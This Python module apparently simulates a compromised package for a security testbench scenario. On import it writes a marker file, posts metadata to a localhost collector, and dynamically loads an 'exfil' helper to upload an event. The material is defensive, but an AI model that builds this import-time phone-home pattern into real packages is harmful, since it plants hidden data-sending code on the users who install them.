"""Simulated 1.82.7-style path: code runs when the package is imported."""

from __future__ import annotations

import json
import os
import urllib.error
import urllib.request
from pathlib import Path

__version__ = "1.82.7"


def _import_trigger() -> None:
    if os.environ.get("TESTBENCH_MODE") != "enabled":
        return
    if os.environ.get("TESTBENCH_OFFLINE") == "1":
        return  # CI / air-gap: no marker or network

    marker = Path.cwd() / ".testbench-litellm-import.json"
    try:
        marker.write_text(
            json.dumps(
                {
                    "scenario": "22-litellm-pypi-compromise",
                    "phase": "import",
                    "version": __version__,
                },
                indent=2,
            ),
            encoding="utf-8",
        )
    except OSError:
        pass

    payload = json.dumps({"type": "import-trigger", "package": "litellm_like", "version": __version__}).encode("utf-8")
    try:
        urllib.request.urlopen(
            "http://127.0.0.1:3022/collect",
            data=payload,
            timeout=2,
        )
    except (urllib.error.URLError, OSError):
        pass

    try:
        _dir = Path.cwd()
        for _ in range(12):
            mod = _dir / "detection-tools" / "floci" / "floci_exfil.py"
            if mod.is_file():
                import importlib.util

                spec = importlib.util.spec_from_file_location("scas_floci_exfil", mod)
                if spec and spec.loader:
                    floci = importlib.util.module_from_spec(spec)
                    spec.loader.exec_module(floci)
                    floci.upload_json(
                        "22",
                        "import-trigger",
                        {"type": "import-trigger", "package": "litellm_like", "version": __version__},
                    )
                break
            _dir = _dir.parent
    except Exception:
        pass


_import_trigger()
